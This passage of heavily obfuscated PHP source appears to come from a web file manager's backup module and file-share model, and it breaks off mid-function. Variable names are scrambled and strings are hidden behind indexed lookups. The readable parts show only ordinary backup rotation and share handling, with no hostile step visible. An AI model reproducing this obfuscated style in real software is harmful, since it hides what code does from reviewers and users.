function init() { $šù—ä‚ú =& $_SERVER[Ì¥ŞÒ°£]; $this->isManual(); self::$name = date($šù—ä‚ú[750]); if (!($‰Ş§‚ö = Model($šù—ä‚ú[751])->lastItem())) { $‰Ş§‚ö = $this->initData(); } else { self::$name = $‰Ş§‚ö[$šù—ä‚ú[32]]; if ($‰Ş§‚ö[$šù—ä‚ú[752]] == $šù—ä‚ú[88]) { self::$name = date($šù—ä‚ú[753]); $¶¥Š¬«­ = 0; if (isset($‰Ş§‚ö[$šù—ä‚ú[293]][$šù—ä‚ú[199]][$šù—ä‚ú[468]])) { $¶¥Š¬«­ = (int) $‰Ş§‚ö[$šù—ä‚ú[293]][$šù—ä‚ú[199]][$šù—ä‚ú[468]]; } if (self::$manual == 0 && $‰Ş§‚ö[$šù—ä‚ú[32]] == self::$name) { Model($šù—ä‚ú[751])->remove($‰Ş§‚ö[$šù—ä‚ú[399]]); } $‰Ş§‚ö = $this->initData($¶¥Š¬«­, $‰Ş§‚ö[$šù—ä‚ú[754]]); } else { $this->checkStore($‰Ş§‚ö[$šù—ä‚ú[754]]); } } self::$option = $‰Ş§‚ö; } private function isManual() { $µöÈõ× = _get($GLOBALS, $_SERVER[Ì¥ŞÒ°£][755], 0); $µöÈõ× = intval($µöÈõ×); self::$manual = $µöÈõ× && $µöÈõ× == 1 ? 1 : 0; } private function initData($Ìƒ‘Ôóú = 0, $à¸ĞŒÙ½ = '') { $¿ÚéµÑ± =& $_SERVER[Ì¥ŞÒ°£]; $è½ïÀÚÖ = Model($¿ÚéµÑ±[751])->config(); if ($à¸ĞŒÙ½ && $è½ïÀÚÖ[$¿ÚéµÑ±[754]] != $à¸ĞŒÙ½) { $Ìƒ‘Ôóú = 0; } $this->checkStore($è½ïÀÚÖ[$¿ÚéµÑ±[754]]); if (self::$manual == 1) { self::$name .= $¿ÚéµÑ±[11] . date($¿ÚéµÑ±[756]); } $ÅÈúŠú = array($¿ÚéµÑ±[754] => $è½ïÀÚÖ[$¿ÚéµÑ±[754]], $¿ÚéµÑ±[32] => self::$name, $¿ÚéµÑ±[752] => 0, $¿ÚéµÑ±[757] => $è½ïÀÚÖ[$¿ÚéµÑ±[757]], $¿ÚéµÑ±[758] => self::$manual, $¿ÚéµÑ±[293] => array($¿ÚéµÑ±[759] => array($¿ÚéµÑ±[752] => 0), $¿ÚéµÑ±[760] => array($¿ÚéµÑ±[752] => 0, $¿ÚéµÑ±[761] => 0, $¿ÚéµÑ±[762] => 0, $¿ÚéµÑ±[33] => $¿ÚéµÑ±[12], $¿ÚéµÑ±[763] => 0, $¿ÚéµÑ±[497] => 0), $¿ÚéµÑ±[764] => array($¿ÚéµÑ±[752] => 0, $¿ÚéµÑ±[761] => 0, $¿ÚéµÑ±[762] => 0, $¿ÚéµÑ±[763] => 0, $¿ÚéµÑ±[497] => 0), $¿ÚéµÑ±[199] => array($¿ÚéµÑ±[752] => 0, $¿ÚéµÑ±[765] => 0, $¿ÚéµÑ±[766] => 0, $¿ÚéµÑ±[767] => 0, $¿ÚéµÑ±[768] => 0, $¿ÚéµÑ±[468] => $Ìƒ‘Ôóú, $¿ÚéµÑ±[763] => 0, $¿ÚéµÑ±[497] => 0)), $¿ÚéµÑ±[763] => time(), $¿ÚéµÑ±[497] => 0); $¿¡Ş×ßÒ = Model($¿ÚéµÑ±[751])->insert($ÅÈúŠú); $ÅÈúŠú[$¿ÚéµÑ±[399]] = $¿¡Ş×ßÒ; return $ÅÈúŠú; } private function checkStore($âõíîÑ) { $á¸Ä©Ã½ =& $_SERVER[Ì¥ŞÒ°£]; $üËá·Ã = Model($á¸Ä©Ã½[769])->listData($âõíîÑ); Model($á¸Ä©Ã½[769])->checkConfig($üËá·Ã); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ì¥ŞÒ°£][751])->findByName(self::$name); } return self::$option; } public static function set($”»®ı‡†) { $¡ğèõŠ» =& $_SERVER[Ì¥ŞÒ°£]; $å×û—á = self::get(); foreach ($”»®ı‡† as $ÀÈ€ÊÒ© => $ÙÕ—åĞ¶) { $öŞğŠ¼ä = explode($¡ğèõŠ»[10], $ÀÈ€ÊÒ©); $ØÇ£ÔÔÈ = count($öŞğŠ¼ä); switch ($ØÇ£ÔÔÈ) { case 1: $å×û—á[$öŞğŠ¼ä[0]] = $ÙÕ—åĞ¶; break; case 2: $å×û—á[$öŞğŠ¼ä[0]][$öŞğŠ¼ä[1]] = $ÙÕ—åĞ¶; break; case 3: $å×û—á[$öŞğŠ¼ä[0]][$öŞğŠ¼ä[1]][$öŞğŠ¼ä[2]] = $ÙÕ—åĞ¶; break; } } Model($¡ğèõŠ»[751])->update($å×û—á[$¡ğèõŠ»[399]], $å×û—á); self::$option = $å×û—á; return self::$option; } public function keep() { $«Û³ÊÕú =& $_SERVER[Ì¥ŞÒ°£]; $ä³Šìì = self::get(); if ($ä³Šìì[$«Û³ÊÕú[293]][$«Û³ÊÕú[759]][$«Û³ÊÕú[752]] == $«Û³ÊÕú[88]) { return; } $this->backupKeep($ä³Šìì); self::set(array($«Û³ÊÕú[770] => 1)); } private function backupKeep($·„¯õı§) { $„Ïµãøİ =& $_SERVER[Ì¥ŞÒ°£]; if (self::$manual == 1) { return; } $¥€îÁ· = Model($„Ïµãøİ[751])->listData(); if (empty($¥€îÁ·)) { return; } $¸ÜŸŸ = 0; $‘Êô—İ‘ = array(); foreach ($¥€îÁ· as $çÑ‡àºŠ) { if ($¸ÜŸŸ >= 7) { break; } $‘Êô—İ‘[] = $çÑ‡àºŠ[$„Ïµãøİ[32]]; $¸ÜŸŸ++; } for ($¸ÜŸŸ = 0; $¸ÜŸŸ < 12; $¸ÜŸŸ++) { $‘Êô—İ‘[] = date($„Ïµãøİ[771], strtotime("\55{$¸ÜŸŸ}\40\155\157\x6e\x74\150\163")); } $‘Êô—İ‘ = array_unique($‘Êô—İ‘); $Õªş‡ = Model($„Ïµãøİ[772])->get($„Ïµãøİ[773]); foreach ($¥€îÁ· as $çÑ‡àºŠ) { if (isset($çÑ‡àºŠ[$„Ïµãøİ[758]]) && $çÑ‡àºŠ[$„Ïµãøİ[758]] == $„Ïµãøİ[88]) { continue; } if (!empty($çÑ‡àºŠ[$„Ïµãøİ[32]]) && in_array($çÑ‡àºŠ[$„Ïµãøİ[32]], $‘Êô—İ‘)) { continue; } Model($„Ïµãøİ[751])->remove($çÑ‡àºŠ[$„Ïµãøİ[399]]); $îÌç’¤ = $this->backupPath($·„¯õı§, $Õªş‡); IO::remove($îÌç’¤, !1); } } private function backupPath($ã£½Î•, $ïÀÇş = false) { $ê´ñÏ•£ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ïÀÇş) { $ïÀÇş = Model($ê´ñÏ•£[772])->get($ê´ñÏ•£[773]); } $¸ïòÉ²« = $ã£½Î•[$ê´ñÏ•£[32]]; $û¯ËæØû = substr(md5($ê´ñÏ•£[774] . $ïÀÇş . $¸ïòÉ²«), 0, 8); return "\173\x69\157\72{$ã£½Î•[$ê´ñÏ•£[754]]}\175\x2f\144\x61\164\141\x62\x61\x73\x65\x2f\x62\x61\x63\153\x75\160\x2f" . $¸ïòÉ²« . $ê´ñÏ•£[11] . $û¯ËæØû; } public function db() { $ï¶úüÍ± =& $_SERVER[Ì¥ŞÒ°£]; $ãäŠºŸî = self::get(); if ($ãäŠºŸî[$ï¶úüÍ±[293]][$ï¶úüÍ±[760]][$ï¶úüÍ±[752]] == $ï¶úüÍ±[88]) { return !0; } $Í Ùá®Æ = new BackupDb(); if (!$Í Ùá®Æ->index()) { return !1; } self::set(array($ï¶úüÍ±[775] => 1)); return !0; } public function dbFile() { $€á¬ª„Ò =& $_SERVER[Ì¥ŞÒ°£]; $Ä´óˆ¤ = self::get(); if ($Ä´óˆ¤[$€á¬ª„Ò[293]][$€á¬ª„Ò[764]][$€á¬ª„Ò[752]] == $€á¬ª„Ò[88]) { return !0; } $Ğøöæã½ = new BackupDbFile(); if (!$Ğøöæã½->index()) { return !1; } self::set(array($€á¬ª„Ò[776] => 1)); return !0; } public function file() { $€ÒÀƒŠ¶ =& $_SERVER[Ì¥ŞÒ°£]; $áñÓâ—ú = self::get(); if ($áñÓâ—ú[$€ÒÀƒŠ¶[293]][$€ÒÀƒŠ¶[199]][$€ÒÀƒŠ¶[752]] == $€ÒÀƒŠ¶[88]) { return !0; } if (!isset($áñÓâ—ú[$€ÒÀƒŠ¶[757]]) || $áñÓâ—ú[$€ÒÀƒŠ¶[757]] == $€ÒÀƒŠ¶[197]) { $Ú–¢¥àÒ = new BackupFile(); if (!$Ú–¢¥àÒ->index()) { return !1; } } self::set(array($€ÒÀƒŠ¶[777] => 1, $€ÒÀƒŠ¶[752] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Î°Ê¦®¾ =& $_SERVER[Ì¥ŞÒ°£]; $Ò¹Ô¿» = Backup::get(); self::$io = $Ò¹Ô¿»[$Î°Ê¦®¾[754]]; self::$name = $Ò¹Ô¿»[$Î°Ê¦®¾[32]]; $–à’ñ™ = new DbManage(); $¸ÜüÃƒö = $–à’ñ™->dbType(); $»èïùßù = array($Î°Ê¦®¾[778] => $¸ÜüÃƒö, $Î°Ê¦®¾[779] => time()); Backup::set($»èïùßù); $¿—‹†ëÁ = $this->tmpFilesPath() . $Î°Ê¦®¾[780] . self::$name . $Î°Ê¦®¾[8]; del_dir($¿—‹†ëÁ); mk_dir($¿—‹†ëÁ); $ÆØöô“ = $ïûòµïØ = 0; $ÄÂË«Œâ = new Task($Î°Ê¦®¾[781], $Î°Ê¦®¾[782], 0, LNG($Î°Ê¦®¾[783]) . $Î°Ê¦®¾[784] . LNG($Î°Ê¦®¾[785])); try { $Ä›»ï Ô = $–à’ñ™->db()->getTables(); } catch (Exception $êÖÛ¡ã¯) { $ÄÂË«Œâ->end(); return !1; } $Ä›»ï Ô = array_diff($Ä›»ï Ô, array($Î°Ê¦®¾[786], $Î°Ê¦®¾[787])); foreach ($Ä›»ï Ô as $ÉŠËÈô) { $ÆØöô“ += $–à’ñ™->model($ÉŠËÈô)->count(); } $ÄÂË«Œâ->task[$Î°Ê¦®¾[788]] = $ÆØöô“; $GLOBALS[$Î°Ê¦®¾[789]] = self::$name; foreach ($Ä›»ï Ô as $ÉŠËÈô) { $–”Ô‚©ƒ = $¿—‹†ëÁ . $ÉŠËÈô . $Î°Ê¦®¾[790]; $Ôï¹Éíå = null; if ($ÉŠËÈô == $Î°Ê¦®¾[791] && (!isset($Ò¹Ô¿»[$Î°Ê¦®¾[757]]) || $Ò¹Ô¿»[$Î°Ê¦®¾[757]] == $Î°Ê¦®¾[197])) { $Ôï¹Éíå = self::$io; } $ïûòµïØ += $–à’ñ™->sqlFromDb($ÉŠËÈô, $–”Ô‚©ƒ, $ÄÂË«Œâ, $Ôï¹Éíå); } unset($GLOBALS[$Î°Ê¦®¾[789]]); $ÄÂË«Œâ->end(); if ($ïûòµïØ > $ÆØöô“) { $ÆØöô“ = $ïûòµïØ; } $»èïùßù = array($Î°Ê¦®¾[778] => $¸ÜüÃƒö, $Î°Ê¦®¾[775] => 1, $Î°Ê¦®¾[792] => $ÆØöô“, $Î°Ê¦®¾[793] => $ïûòµïØ, $Î°Ê¦®¾[794] => time()); Backup::set($»èïùßù); if ($ÆØöô“ - $ïûòµïØ > 0) { $ÀÒµˆ€Í = $Î°Ê¦®¾[795]; if (stristr(I18n::getType(), $Î°Ê¦®¾[796])) { $ÀÒµˆ€Í = $Î°Ê¦®¾[797]; } write_log(array($ÀÒµˆ€Í, $»èïùßù), $Î°Ê¦®¾[782]); return !1; } return !0; } private function tmpFilesPath() { $ó–×“û =& $_SERVER[Ì¥ŞÒ°£]; $ëÈš°Çà = TEMP_FILES; if ($GLOBALS[$ó–×“û[6]][$ó–×“û[89]][$ó–×“û[798]]) { $ëÈš°Çà = $GLOBALS[$ó–×“û[6]][$ó–×“û[89]][$ó–×“û[798]]; if (!mk_dir($ëÈš°Çà) || !is_writable($ëÈš°Çà) || !IO::mkfile($ëÈš°Çà . $ó–×“û[799])) { $ëÈš°Çà = TEMP_FILES; } } return $ëÈš°Çà; } } goto f«´Òš¹¨; B‚ˆ¿æ»Ãæ: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\151\x6d\x65", "\x74\151\155\145", "\x69\156\x73\145\162\164\54\x75\160\144\141\164\145", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\x63\x72\145\141\x74\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\x74\151\x6f\x6e"), array("\157\160\x74\151\x6f\x6e\163", '', "\x69\x6e\163\145\162\164\54\x75\160\144\141\164\x65\x2c\x73\145\154\145\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($§é‹½¬) { $¤Â¾ş¶ =& $_SERVER[Ì¥ŞÒ°£]; $şÎ¾õñ¼ = isset($§é‹½¬[0]) ? $§é‹½¬[0] : !1; return array($¤Â¾ş¶[1996] => array(USER_ID, $¤Â¾ş¶[1997]), $¤Â¾ş¶[1937] => array($şÎ¾õñ¼, $¤Â¾ş¶[1998])); } protected function listSimple() { $ã¾µŞ…´ = array($_SERVER[Ì¥ŞÒ°£][1667] => USER_ID); $ëüšŸ¨ı = $this->field($this->fieldList)->where($ã¾µŞ…´)->select(); return $ëüšŸ¨ı ? $ëüšŸ¨ı : array(); } protected function getInfo($™¢ˆë¨å, $Ô–Àâ¢õ = false) { $¸îÌ“ÑÅ =& $_SERVER[Ì¥ŞÒ°£]; if ($Ô–Àâ¢õ) { return $this->_getShareInfo(array($¸îÌ“ÑÅ[489] => $™¢ˆë¨å)); } $øš«Äë = $this->cacheFunctionGet($¸îÌ“ÑÅ[1939], $™¢ˆë¨å); return $øš«Äë; } public function getInfoByHash($’€ƒ¾–º) { return $this->_getShareInfo(array($_SERVER[Ì¥ŞÒ°£][491] => $’€ƒ¾–º)); } public function getInfoByPath($Óö»ĞÈ) { $ÆÒ¹ÕÃ =& $_SERVER[Ì¥ŞÒ°£]; $ü¦ÇÏá¨ = array($ÆÒ¹ÕÃ[1667] => USER_ID, $ÆÒ¹ÕÃ[402] => $Óö»ĞÈ); return $this->_getShareInfo($ü¦ÇÏá¨); } public function getInfoBySourcePath($Å²ÎÇØ‚) { $›±¾¡Ô¹ =& $_SERVER[Ì¥ŞÒ°£]; $ÊÖğ„’ = array($›±¾¡Ô¹[1667] => USER_ID, $›±¾¡Ô¹[1181] => $Å²ÎÇØ‚); return $this->_getShareInfo($ÊÖğ„’); } private function _getShareInfo($Êœ—¤Ñ¬) { $Ã¿ÕÂÂ… =& $_SERVER[Ì¥ŞÒ°£]; $Üñô×¦ì = $this->where($Êœ—¤Ñ¬)->find(); if (!$Üñô×¦ì) { return !1; } $Êœ—¤Ñ¬ = array($Ã¿ÕÂÂ…[489] => $Üñô×¦ì[$Ã¿ÕÂÂ…[489]]); $½õú½Å = $Ã¿ÕÂÂ…[1999]; $ÎÀÉáŒ = Model($Ã¿ÕÂÂ…[602])->order($Ã¿ÕÂÂ…[399])->field($½õú½Å)->where($Êœ—¤Ñ¬)->select(); if ($Üñô×¦ì[$Ã¿ÕÂÂ…[402]] == $Ã¿ÕÂÂ…[197]) { $Üñô×¦ì[$Ã¿ÕÂÂ…[86]] = IO::info($Üñô×¦ì[$Ã¿ÕÂÂ…[1181]]); } else { $Üñô×¦ì[$Ã¿ÕÂÂ…[86]] = Model($Ã¿ÕÂÂ…[1341])->pathInfo($Üñô×¦ì[$Ã¿ÕÂÂ…[402]]); } $Üñô×¦ì[$Ã¿ÕÂÂ…[2000]] = $ÎÀÉáŒ; return $Üñô×¦ì; } protected function getInfoAuth($œÜçƒ”ï) { $×æĞ£€İ =& $_SERVER[Ì¥ŞÒ°£]; $ıïİîÙÎ = $this->getInfo($œÜçƒ”ï); if ($ıïİîÙÎ[$×æĞ£€İ[1667]] == USER_ID) { $ıïİîÙÎ[$×æĞ£€İ[413]] = $ıïİîÙÎ[$×æĞ£€İ[86]][$×æĞ£€İ[413]]; } else { $ıïİîÙÎ[$×æĞ£€İ[413]] = Model($×æĞ£€İ[502])->authMake($ıïİîÙÎ[$×æĞ£€İ[2000]]); } return $ıïİîÙÎ; } protected function listData($äÎîËœ® = null, $«Ä¦Ñµ = 300) { $éªú³¬ =& $_SERVER[Ì¥ŞÒ°£]; $Ô©±Ÿé» = array(array($éªú³¬[494] => array($éªú³¬[1017], 0), $éªú³¬[496] => array($éªú³¬[1017], 0), $éªú³¬[2001] => $éªú³¬[1955])); if ($äÎîËœ® == $éªú³¬[2002]) { $Ô©±Ÿé» = array($éªú³¬[494] => 1); } else { if ($äÎîËœ® == $éªú³¬[1166]) { $Ô©±Ÿé» = array($éªú³¬[496] => 1); } } $Ô©±Ÿé»[$éªú³¬[1667]] = USER_ID; $¸ò¿‚ = $this->where($Ô©±Ÿé»)->selectPage($«Ä¦Ñµ); return $¸ò¿‚; } protected function listToMe($úú‘Äù = 300) { $Š†­§À” =& $_SERVER[Ì¥ŞÒ°£]; $ŞÜ™ôğ’ = Model($Š†­§À”[2003])->userGroupParents(USER_ID); $â•¥¾Û™ = array($Š†­§À”[586] => SourceModel::TYPE_USER, $Š†­§À”[505] => USER_ID); if ($ŞÜ™ôğ’) { $â•¥¾Û™ = array(array($Š†­§À”[586] => SourceModel::TYPE_USER, $Š†­§À”[505] => USER_ID), array($Š†­§À”[586] => SourceModel::TYPE_GROUP, $Š†­§À”[505] => array($Š†­§À”[7], $ŞÜ™ôğ’)), $Š†­§À”[2001] => $Š†­§À”[1955]); } $¤Ê­ÏÁ³ = Model($Š†­§À”[602])->where($â•¥¾Û™)->selectPage($úú‘Äù); $ôÕüƒâÙ = array_to_keyvalue_group($¤Ê­ÏÁ³[$Š†­§À”[369]], $Š†­§À”[489]); if (!$ôÕüƒâÙ) { return $¤Ê­ÏÁ³; } $ØÈ¥ÊÏ» = $Š†­§À”[2004]; $â•¥¾Û™ = array($Š†­§À”[489] => array($Š†­§À”[418], array_keys($ôÕüƒâÙ)), $Š†­§À”[1667] => array($Š†­§À”[1019], $Š†­§À”[197])); $¢ÆÍ”ìğ = $this->field($ØÈ¥ÊÏ»)->where($â•¥¾Û™)->select(); foreach ($¢ÆÍ”ìğ as $×½—¯æø => &$ÆàìØ‰°) { $ÆàìØ‰°[$Š†­§À”[2000]] = $ôÕüƒâÙ[$ÆàìØ‰°[$Š†­§À”[489]]]; } unset($ÆàìØ‰°); $¥µ¡ãÒş = array($Š†­§À”[2005] => $¢ÆÍ”ìğ, $Š†­§À”[2006] => $¤Ê­ÏÁ³[$Š†­§À”[366]]); return $¥µ¡ãÒş; } protected function shareAdd($æŒ™å†, $˜¦¨¦Â) { $À‚´ÏÜ™ =& $_SERVER[Ì¥ŞÒ°£]; $çñÄÎÍ¸ = $this->_addShareData($æŒ™å†, $˜¦¨¦Â); if (!empty($˜¦¨¦Â[$À‚´ÏÜ™[2007]])) { $this->_shareAuthSet($çñÄÎÍ¸, $˜¦¨¦Â[$À‚´ÏÜ™[2007]]); } $this->shareEventAdd($æŒ™å†, $˜¦¨¦Â, $À‚´ÏÜ™[1169]); return $çñÄÎÍ¸; } protected function shareAddSystem($ŒÓÈé÷Ï, $šÚ‹Â­) { $€´ìÃÇˆ =& $_SERVER[Ì¥ŞÒ°£]; $‹ëòĞé = $this->_addShareData($ŒÓÈé÷Ï, $šÚ‹Â­, $€´ìÃÇˆ[1290]); $this->_shareAuthSet($‹ëòĞé, $šÚ‹Â­[$€´ìÃÇˆ[2007]]); return $‹ëòĞé; } private function shareEventAdd($¬ûˆÃáÄ, $üëˆ¼Ç…, $·•áÕ¿¾ = "\x61\144\144") { $í”´ªöä =& $_SERVER[Ì¥ŞÒ°£]; if (!$¬ûˆÃáÄ || $¬ûˆÃáÄ == $í”´ªöä[197]) { return; } if ($·•áÕ¿¾ == $í”´ªöä[1169]) { if ($üëˆ¼Ç…[$í”´ªöä[494]] == $í”´ªöä[88]) { Model($í”´ªöä[570])->eventShare($¬ûˆÃáÄ, $í”´ªöä[2008]); } if ($üëˆ¼Ç…[$í”´ªöä[496]] == $í”´ªöä[88]) { Model($í”´ªöä[570])->eventShare($¬ûˆÃáÄ, $í”´ªöä[2009]); } return; } $Ì„»•Ç = $this->getInfoByPath($¬ûˆÃáÄ); $çÏ™ªß‘ = $í”´ªöä[2010]; if ($Ì„»•Ç[$í”´ªöä[494]] == $í”´ªöä[197] && $üëˆ¼Ç…[$í”´ªöä[494]] == $í”´ªöä[88]) { $çÏ™ªß‘ = $í”´ªöä[2008]; } if ($Ì„»•Ç[$í”´ªöä[494]] == $í”´ªöä[88] && $üëˆ¼Ç…[$í”´ªöä[494]] == $í”´ªöä[197]) { $çÏ™ªß‘ = $í”´ªöä[2011]; } if ($Ì„»•Ç[$í”´ªöä[496]] == $í”´ªöä[197] && $üëˆ¼Ç…[$í”´ªöä[496]] == $í”´ªöä[88]) { $çÏ™ªß‘ = $í”´ªöä[2009]; } if ($Ì„»•Ç[$í”´ªöä[496]] == $í”´ªöä[88] && $üëˆ¼Ç…[$í”´ªöä[496]] == $í”´ªöä[197]) { $çÏ™ªß‘ = $í”´ªöä[2012]; } Model($í”´ªöä[570])->eventShare($¬ûˆÃáÄ, $çÏ™ªß‘); return; } private function _addShareData($Ñ¾ˆœ¸, $ÇØºôÂ¬ = array(), $È›ñà = false) { $ï¬öùš =& $_SERVER[Ì¥ŞÒ°£]; $ÙºÀâ‘¾ = $È›ñà == $ï¬öùš[1290] ? 0 : USER_ID; $ÂŸÖŒ¸Û = array($ï¬öùš[417] => $Ñ¾ˆœ¸, $ï¬öùš[1658] => $ÙºÀâ‘¾); if ($Ñ¾ˆœ¸ == 0) { $ÂŸÖŒ¸Û = array($ï¬öùš[2013] => $ÇØºôÂ¬[$ï¬öùš[1181]], $ï¬öùš[1658] => $ÙºÀâ‘¾); } if ($¸–‰â•ì = $this->where($ÂŸÖŒ¸Û)->find()) { return $¸–‰â•ì[$ï¬öùš[489]]; } if ($Ñ¾ˆœ¸ == 0) { $Æ©üåÉù = array($ï¬öùš[32] => get_path_this($ÇØºôÂ¬[$ï¬öùš[84]])); } else { $Æ©üåÉù = Model($ï¬öùš[827])->sourceInfo($Ñ¾ˆœ¸); if (!$Æ©üåÉù) { return !1; } } if (!$ÇØºôÂ¬[$ï¬öùš[1567]]) { $ÇØºôÂ¬[$ï¬öùš[1567]] = $Æ©üåÉù[$ï¬öùš[32]]; } $Çº É˜ = array($ï¬öùš[1658] => $ÙºÀâ‘¾, $ï¬öùš[417] => $Ñ¾ˆœ¸, $ï¬öùš[1567] => $ï¬öùš[12], $ï¬öùš[494] => 0, $ï¬öùš[496] => 0, $ï¬öùš[1181] => $ï¬öùš[12], $ï¬öùš[307] => $ï¬öùš[12], $ï¬öùš[892] => $ï¬öùš[12], $ï¬öùš[2014] => 0, $ï¬öùš[2015] => 0, $ï¬öùš[497] => 0, $ï¬öùš[498] => $ï¬öùš[12], $ï¬öùš[491] => $ï¬öùš[12]); $Ë´ßİÔ• = explode($ï¬öùš[50], $ï¬öùš[2016]); foreach ($Ë´ßİÔ• as $Åó‡ï–¹) { if (!isset($ÇØºôÂ¬[$Åó‡ï–¹])) { continue; } $Çº É˜[$Åó‡ï–¹] = $ÇØºôÂ¬[$Åó‡ï–¹]; } $ä²ÂÔ‘Æ = $this->add($Çº É˜); $ÚíüÏÂ» = array($ï¬öùš[491] => short_id($ä²ÂÔ‘Æ)); $this->where(array($ï¬öùš[488] => $ä²ÂÔ‘Æ))->save($ÚíüÏÂ»); return $ä²ÂÔ‘Æ; } private function _shareAuthSet($Èõó¹“ƒ, $ˆö¡Š) { $â¦Å«öˆ =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($ˆö¡Š)) { return !1; } $ãåé¡Ô™ = Model($â¦Å«öˆ[1965]); $ãåé¡Ô™->where(array($â¦Å«öˆ[489] => $Èõó¹“ƒ))->delete(); $Øş¯È¬ = array(); foreach ($ˆö¡Š as $âö‚äñ¼) { $À×ê¥Ÿö = SourceModel::TYPE_USER; if ($âö‚äñ¼[$â¦Å«öˆ[411]] == SourceModel::TYPE_GROUP) { $À×ê¥Ÿö = SourceModel::TYPE_GROUP; } $‚˜¼Şˆî = array($â¦Å«öˆ[489] => $Èõó¹“ƒ, $â¦Å«öˆ[411] => $À×ê¥Ÿö, $â¦Å«öˆ[505] => intval($âö‚äñ¼[$â¦Å«öˆ[505]]), $â¦Å«öˆ[1961] => 0, $â¦Å«öˆ[2017] => -1); if ($âö‚äñ¼[$â¦Å«öˆ[1961]]) { $‚˜¼Şˆî[$â¦Å«öˆ[1961]] = $âö‚äñ¼[$â¦Å«öˆ[1961]]; } else { if ($âö‚äñ¼[$â¦Å«öˆ[2017]]) { $‚˜¼Şˆî[$â¦Å«öˆ[2017]] = $âö‚äñ¼[$â¦Å«öˆ[2017]]; } } $Øş¯È¬[] = $‚˜¼Şˆî; } return $ãåé¡Ô™->addAll($Øş¯È¬, array(), !0); } public function numViewAdd($à¡¼êÕ) { $•ÆÒµ†´ =& $_SERVER[Ì¥ŞÒ°£]; $Š«³ôó = array($•ÆÒµ†´[488] => $à¡¼êÕ); $this->where($Š«³ôó)->setAdd($•ÆÒµ†´[2014]); } public function numDownloadAdd($ÆËµ¬˜Ñ) { $´£Œ˜‡ =& $_SERVER[Ì¥ŞÒ°£]; $ÕÅØ·ÙŒ = array($´£Œ˜‡[488] => $ÆËµ¬˜Ñ); $this->where($ÕÅØ·ÙŒ)->setAdd($´£Œ˜‡[2015]); } protected function shareEdit($Ô³Œ·ç, $‰Öæñ–Ã) { $•âòÀÖÉ =& $_SERVER[Ì¥ŞÒ°£]; $’¨±åìà = $this->getInfo($Ô³Œ·ç); if (!$’¨±åìà) { return !1; } $this->_checkLinkShare($‰Öæñ–Ã, $’¨±åìà); $¥‘‚øóö = array(); $•ëóÏœÁ = explode($•âòÀÖÉ[50], $•âòÀÖÉ[2018]); foreach ($•ëóÏœÁ as $±Ş¬ç–“) { if (!array_key_exists($±Ş¬ç–“, $‰Öæñ–Ã)) { continue; } $¥‘‚øóö[$±Ş¬ç–“] = $‰Öæñ–Ã[$±Ş¬ç–“]; } $this->shareEventAdd($’¨±åìà[$•âòÀÖÉ[402]], $‰Öæñ–Ã, $•âòÀÖÉ[1827]); $this->where(array($•âòÀÖÉ[488] => $Ô³Œ·ç))->save($¥‘‚øóö); if (isset($‰Öæñ–Ã[$•âòÀÖÉ[2007]])) { $this->_shareAuthSet($Ô³Œ·ç, $‰Öæñ–Ã[$•âòÀÖÉ[2007]]); } return !0; } private function _checkLinkShare($Ô¿Ğøœ, $ĞÕó÷äÆ) { $¯ÚªÊ¥™ =& $_SERVER[Ì¥ŞÒ°£]; if ($Ô¿Ğøœ[$¯ÚªÊ¥™[494]] != $¯ÚªÊ¥™[88]) { return; } $“”Ë»¥ = $ĞÕó÷äÆ[$¯ÚªÊ¥™[86]][$¯ÚªÊ¥™[402]]; if ($ĞÕó÷äÆ[$¯ÚªÊ¥™[86]][$¯ÚªÊ¥™[33]] != $¯ÚªÊ¥™[199]) { $ŸŒä°ìÛ = $this->_folderReport($“”Ë»¥); if (!$ŸŒä°ìÛ) { return; } show_json(LNG($¯ÚªÊ¥™[2019]) . $¯ÚªÊ¥™[2020] . $ŸŒä°ìÛ, !1); } $åŒ¸šš¯ = Model($¯ÚªÊ¥™[827])->fileInfoGet($ĞÕó÷äÆ[$¯ÚªÊ¥™[86]][$¯ÚªÊ¥™[402]]); if (!$åŒ¸šš¯) { return; } $Ôåúåîú = $this->shareFileMeta($åŒ¸šš¯[$¯ÚªÊ¥™[468]]); if (isset($Ôåúåîú[$¯ÚªÊ¥™[374]]) && $Ôåúåîú[$¯ÚªÊ¥™[374]] == $¯ÚªÊ¥™[88]) { show_json(LNG($¯ÚªÊ¥™[2021]), !1); } } private function _folderReport($®Š«å²ã) { $”ˆ¹µ =& $_SERVER[Ì¥ŞÒ°£]; $ØòÖ¯•ß = array($”ˆ¹µ[468] => array($”ˆ¹µ[1017], 0), $”ˆ¹µ[752] => 3); $İä„®¸ = Model($”ˆ¹µ[2022])->where($ØòÖ¯•ß)->field($”ˆ¹µ[468])->select(); if (!$İä„®¸) { return !1; } $İä„®¸ = array_to_keyvalue($İä„®¸, $”ˆ¹µ[12], $”ˆ¹µ[468]); $ôåÑ¥Ìñ = $”ˆ¹µ[50] . $®Š«å²ã . $”ˆ¹µ[50]; $ØòÖ¯•ß = array($”ˆ¹µ[468] => array($”ˆ¹µ[7], $İä„®¸), $”ˆ¹µ[521] => array($”ˆ¹µ[383], "\x25{$ôåÑ¥Ìñ}\45"), $”ˆ¹µ[431] => 0); $ŠØôØÈá = Model($”ˆ¹µ[827])->where($ØòÖ¯•ß)->field($”ˆ¹µ[2023])->find(); if (!$ŠØôØÈá) { return !1; } $ÚòÌ©« = substr($ŠØôØÈá[$”ˆ¹µ[521]], strpos($ŠØôØÈá[$”ˆ¹µ[521]], $ôåÑ¥Ìñ)); $ØòÖ¯•ß = array($”ˆ¹µ[402] => array($”ˆ¹µ[7], trim($ÚòÌ©«, $”ˆ¹µ[50]))); $ö±²à½ = Model($”ˆ¹µ[827])->where($ØòÖ¯•ß)->field($”ˆ¹µ[32])->select(); $×´Í˜ªñ = array_to_keyvalue($ö±²à½, $”ˆ¹µ[12], $”ˆ¹µ[32]); $×´Í˜ªñ[] = $ŠØôØÈá[$”ˆ¹µ[32]]; return implode($”ˆ¹µ[8], $×´Í˜ªñ); } protected function remove($…´´ğ¿É) { $Ş£æÔü 